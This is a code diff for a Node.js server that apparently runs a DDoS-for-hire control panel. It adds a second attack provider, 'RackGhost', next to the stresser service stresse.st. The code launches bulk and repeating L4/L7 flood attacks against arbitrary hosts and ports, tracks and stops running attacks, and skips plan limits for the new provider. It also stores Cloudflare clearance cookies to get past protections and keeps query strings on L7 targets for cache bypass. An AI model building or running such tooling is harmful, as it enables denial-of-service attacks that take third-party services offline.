@@ -18,6 +18,7 @@ const phish = require('./phish');
 const { initImpact, getImpactForUser } = require('./impact');
 const { initInvader, getInvaderState, invaderAddSite, invaderRemoveSite, invaderSetInterval, invaderHistory, runChecks: invaderRunChecks } = require('./invader');
 const { initWatch, getState: watchState, addKeyword, removeKeyword, addSite, removeSite, triggerScan } = require('./watch');
+const rackghost = require('./rackghost');
 
 // stresse.st istekleri icin opsiyonel cikis proxy'si (HTTP veya SOCKS5;
 // or. http://user:pass@ip:port ya da socks5://127.0.0.1:1080).
@@ -892,6 +893,7 @@ function registerAttack(attackId, sessionId, params, loopId = null, concurrents 
     time: parseInt(params.time) || 0,
     concurrents: parseInt(concurrents) || 1,
     loopId: loopId || null,
+    provider: params.provider || 'stresse',
     group: params.group || null, // dogrudan saldirida form secimi; loop'ta loop.group uzerinden
     startedAt: new Date().toISOString(),
     expiresAt: new Date(Date.now() + remainingSec * 1000).toISOString()
@@ -1789,6 +1791,33 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
     const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
     const note = sanitizeNote(req.body.note);
     const rawHost = req.body.host;
+    const provider = req.body.provider === 'rackghost' ? 'rackghost' : 'stresse';
+
+    // --- RackGhost provider: stresse akisindan tamamen ayri ---
+    if (provider === 'rackghost') {
+      const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
+      if (!host || !port || !time || !method) {
+        return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
+      }
+      const count = Math.max(1, parseInt(concurrents) || 1);
+      if (count > rackghost.LIMITS.maxConcurrents) {
+        return res.status(400).json({ status: 'error', message: `RackGhost maksimum concurrent ${rackghost.LIMITS.maxConcurrents}` });
+      }
+      if (parseInt(time) > rackghost.LIMITS.maxTime) {
+        return res.status(400).json({ status: 'error', message: `RackGhost maksimum süre ${rackghost.LIMITS.maxTime} saniye` });
+      }
+      try {
+        const result = await rackghost.startAttack({ host, port: parseInt(port), time: parseInt(time), concurrents: count, method });
+        result.attackIds.forEach((attackId) => {
+          registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, provider: 'rackghost', group: resolveGroupName(req.body.group) || undefined });
+        });
+        addAttackHistory(sessionId, { host, port, method, time, layer, note }, { concurrents: count });
+        return res.json({ status: 'success', message: `${result.attackIds.length} saldırı başlatıldı (RackGhost)`, attackIds: result.attackIds });
+      } catch (err) {
+        return res.status(err.sessionExpired ? 503 : 502).json({ status: 'error', message: `RackGhost: ${err.message}` });
+      }
+    }
+
     if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
       return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
     }
@@ -2088,7 +2117,8 @@ async function runLoopRound(loopId) {
   if (!loop || !loop.running) return;
 
   const session = sessions[loop.sessionId];
-  if (!session || !session.apiToken) {
+  const isRackghost = loop.params.provider === 'rackghost';
+  if (!isRackghost && (!session || !session.apiToken)) {
     console.error(`[loop ${loopId}] API token bulunamadi, loop durduruluyor`);
     loop.stopReason = 'error';
     loop.stopDetail = 'API token bulunamadı (oturum kapanmış veya süresi dolmuş)';
@@ -2115,8 +2145,6 @@ async function runLoopRound(loopId) {
   // limitini asmayiz.
   const previousRoundIds = loop.roundAttackIds || [];
   if (previousRoundIds.length > 0) {
-    const webClient = getClient(loop.sessionId);
-    const username = session.username;
     const maxWaitMs = 60 * 1000;
     // 2sn yerine 500ms yoklama: bitis->yeni tur boslugu ~1.5-2.5sn'ye iner.
     // Daha sıkı yoklama upstream'i yormaz (hafif GET); ama slot doluyken
@@ -2125,21 +2153,38 @@ async function runLoopRound(loopId) {
     const startedWaiting = Date.now();
     let stillActive = new Set(previousRoundIds);
 
-    while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
-      try {
-        const ongoingRes = await webClient.get(`/ongoing/${username}`);
-        const ongoingList = Array.isArray(ongoingRes.data)
-          ? ongoingRes.data
-          : (ongoingRes.data?.attacks || []);
-        const ongoingIds = new Set(ongoingList.map((a) => a.attack_id || a.id));
-        stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(id)));
-        if (stillActive.size > 0) {
-          console.log(`[loop ${loopId}] ${stillActive.size} onceki saldiri hala aktif, bekleniyor...`);
+    if (isRackghost) {
+      // RackGhost: onceki tur ID'leri rackghost ongoing'den dusene kadar bekle
+      while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
+        try {
+          const ongoingList = await rackghost.getOngoing();
+          const ongoingIds = new Set(ongoingList.map((a) => String(a.id || a.attack_id)));
+          stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(String(id))));
+          if (stillActive.size > 0) await new Promise((r) => setTimeout(r, checkIntervalMs));
+        } catch (err) {
+          console.warn(`[loop ${loopId}] rackghost ongoing hatasi:`, err.message);
           await new Promise((r) => setTimeout(r, checkIntervalMs));
         }
-      } catch (err) {
-        console.warn(`[loop ${loopId}] /ongoing kontrolu hatasi:`, err.message);
-        await new Promise((r) => setTimeout(r, checkIntervalMs));
+      }
+    } else {
+      const webClient = getClient(loop.sessionId);
+      const username = session.username;
+      while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
+        try {
+          const ongoingRes = await webClient.get(`/ongoing/${username}`);
+          const ongoingList = Array.isArray(ongoingRes.data)
+            ? ongoingRes.data
+            : (ongoingRes.data?.attacks || []);
+          const ongoingIds = new Set(ongoingList.map((a) => a.attack_id || a.id));
+          stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(id)));
+          if (stillActive.size > 0) {
+            console.log(`[loop ${loopId}] ${stillActive.size} onceki saldiri hala aktif, bekleniyor...`);
+            await new Promise((r) => setTimeout(r, checkIntervalMs));
+          }
+        } catch (err) {
+          console.warn(`[loop ${loopId}] /ongoing kontrolu hatasi:`, err.message);
+          await new Promise((r) => setTimeout(r, checkIntervalMs));
+        }
       }
     }
 
@@ -2165,7 +2210,22 @@ async function runLoopRound(loopId) {
   // Tek istekte istenen concurrents kadar saldiri baslat.
   // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
   try {
-    const { data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
+    let data, attackIds, elapsedSec;
+    if (loop.params.provider === 'rackghost') {
+      // RackGhost: stresse launch akisindan bagimsiz, dogrudan adapter uzerinden.
+      const rgResult = await rackghost.startAttack({
+        host: loop.params.host,
+        port: loop.params.port,
+        time: loop.params.time,
+        concurrents: loop.params.concurrents,
+        method: loop.params.method
+      });
+      data = { status: 'success' };
+      attackIds = rgResult.attackIds;
+      elapsedSec = 0;
+    } else {
+      ({ data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId));
+    }
     if (attackIds.length > 0) {
       roundSuccesses = attackIds.length;
       loop.roundAttackIds = attackIds;
@@ -2308,6 +2368,7 @@ app.post('/api/stresse/loop', async (req, res) => {
     const { port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
     const note = sanitizeNote(req.body.note);
     const rawHost = req.body.host;
+    const provider = req.body.provider === 'rackghost' ? 'rackghost' : 'stresse';
     // L7'de path/query korunur (cache-bypass); L4'te bare host zorunlu.
     const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
     if (!host || !port || !time || !method) {
@@ -2317,10 +2378,20 @@ app.post('/api/stresse/loop', async (req, res) => {
     // loop ID'leri gecersiz olur. Frontend response'taki loopId'yi kullanir.
     // Sorgulu L7 hedeflerinde query ID'ye girmesin diye bare host kullanilir.
     const loopId = `${normalizeHost(rawHost) || host}:${port}_${method}_${Date.now()}`;
-    console.log(`[loop/create] ${host}:${port} ${method} layer=${layer} time=${time} concurrents=${concurrents} interval=${interval}`);
+    console.log(`[loop/create] ${host}:${port} ${method} layer=${layer} time=${time} concurrents=${concurrents} interval=${interval} provider=${provider}`);
 
-    if (isFreeMethod(method)) {
+    if (provider === 'stresse' && isFreeMethod(method)) {
       return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
+    }
+
+    // RackGhost limitleri (stresse plan limiti bu provider'a uygulanmaz)
+    if (provider === 'rackghost') {
+      if (parseInt(concurrents) > rackghost.LIMITS.maxConcurrents) {
+        return res.status(400).json({ status: 'error', message: `RackGhost maksimum concurrent ${rackghost.LIMITS.maxConcurrents}` });
+      }
+      if (parseInt(time) > rackghost.LIMITS.maxTime) {
+        return res.status(400).json({ status: 'error', message: `RackGhost maksimum süre ${rackghost.LIMITS.maxTime} saniye` });
+      }
     }
 
     // Mukerrer loop engeli: ayni hedef+port+method+layer icin calisan loop
@@ -2342,9 +2413,11 @@ app.post('/api/stresse/loop', async (req, res) => {
       return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
     }
 
-    const planCheck = checkPlanLimits(sessionId, time, concurrents);
-    if (!planCheck.ok) {
-      return res.status(403).json({ status: 'error', message: planCheck.message });
+    if (provider === 'stresse') {
+      const planCheck = checkPlanLimits(sessionId, time, concurrents);
+      if (!planCheck.ok) {
+        return res.status(403).json({ status: 'error', message: planCheck.message });
+      }
     }
 
     // Loop saldirisini history'ye sadece bir kez kaydet
@@ -2366,7 +2439,7 @@ app.post('/api/stresse/loop', async (req, res) => {
       // Grup (opsiyonel): yoksa olusturulur, loop ona dahil olur
       group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined,
 
-      params: { host, port: parseInt(port), time: parseInt(time), method: method.toLowerCase(), subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
+      params: { host, port: parseInt(port), time: parseInt(time), method: provider === 'rackghost' ? String(method).toUpperCase() : method.toLowerCase(), subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer, provider },
       displayTarget: layer === 'L7' ? host : `${host}:${port}`,
       startedAt: new Date().toISOString(),
       lastRoundAt: null,
@@ -3450,6 +3523,26 @@ async function liveHubTick(hub, username) {
     if (!Array.isArray(ongoingData)) {
       ongoingData = Array.isArray(hub.lastOngoing) ? hub.lastOngoing : [];
     }
+    // RackGhost aktif saldirilari canli listeye ekle (provider rozeti ile)
+    if (rackghost.isConfigured()) {
+      try {
+        const rgList = await rackghost.getOngoing();
+        rgList.forEach((a) => {
+          const created = a.created_at ? Date.parse(String(a.created_at).replace(' ', 'T')) : NaN;
+          const dur = parseInt(a.time, 10) || 0;
+          const tl = Number.isFinite(created) ? Math.max(0, Math.round((created + dur * 1000 - Date.now()) / 1000)) : dur;
+          ongoingData.push({
+            attack_id: `rg_${a.id}`,
+            target: `${a.host}:${a.port}`,
+            method: a.method,
+            timeLeft: String(tl),
+            provider: 'rackghost'
+          });
+        });
+      } catch (rgErr) {
+        // Oturum hatasi watchdog'da raporlaniyor; canli akisi kesme.
+      }
+    }
     hub.lastOngoing = ongoingData;
     if (user) hub.lastUser = user.data;
     hub.consecutiveErrors = 0;
@@ -3540,6 +3633,59 @@ app.get('/api/health', (req, res) => {
 });
 
 // =====================
+// RACKGHOST PROVIDER
+// =====================
+
+// Oturum/limit durumu
+app.get('/api/rackghost/status', (req, res) => {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+  res.json(rackghost.getStatus());
+});
+
+// Cookie/proxy guncelleme (CF relay oturumu yenileme)
+app.post('/api/rackghost/config', (req, res) => {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+  const { cfClearance, sessionId: rgSession, userAgent, proxy, api } = req.body || {};
+  const status = rackghost.updateConfig({ cfClearance, sessionId: rgSession, userAgent, proxy, api });
+  res.json({ status: 'success', ...status });
+});
+
+// Method listesi (L4/L7 etiketli)
+app.get('/api/rackghost/methods', (req, res) => {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+  res.json({ methods: rackghost.getMethods(), limits: rackghost.LIMITS });
+});
+
+// Aktif saldirilar (RackGhost)
+app.get('/api/rackghost/ongoing', async (req, res) => {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+  try {
+    const list = await rackghost.getOngoing();
+    res.json({ attacks: list });
+  } catch (err) {
+    res.status(err.sessionExpired ? 503 : 502).json({ status: 'error', message: err.message });
+  }
+});
+
+// RackGhost saldiri durdur
+app.post('/api/rackghost/stop', async (req, res) => {
+  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
+  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
+  const { id, host } = req.body || {};
+  if (!id || !host) return res.status(400).json({ status: 'error', message: 'id ve host gerekli' });
+  try {
+    const data = await rackghost.stopAttack(id, host);
+    res.json({ status: 'success', data });
+  } catch (err) {
+    res.status(502).json({ status: 'error', message: err.message });
+  }
+});
+
+// =====================
 // PHISHGUARD INTEGRATION (read-only SQLite)
 // =====================
 
@@ -3591,6 +3737,8 @@ initImpact({ activeAttacks, activeLoops, sessions, getLoopOwner });
 initWatch();
 // Invader Control (Node surumu): site cloak/durum kontrolu, degisimde DM
 initInvader();
+// RackGhost provider (stresse.st alternatifi): CF relay session ile stresser_api
+rackghost.initRackghost();
 // Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
 // bazinda baz al.
 Object.values(activeAttacks).forEach((a) => {
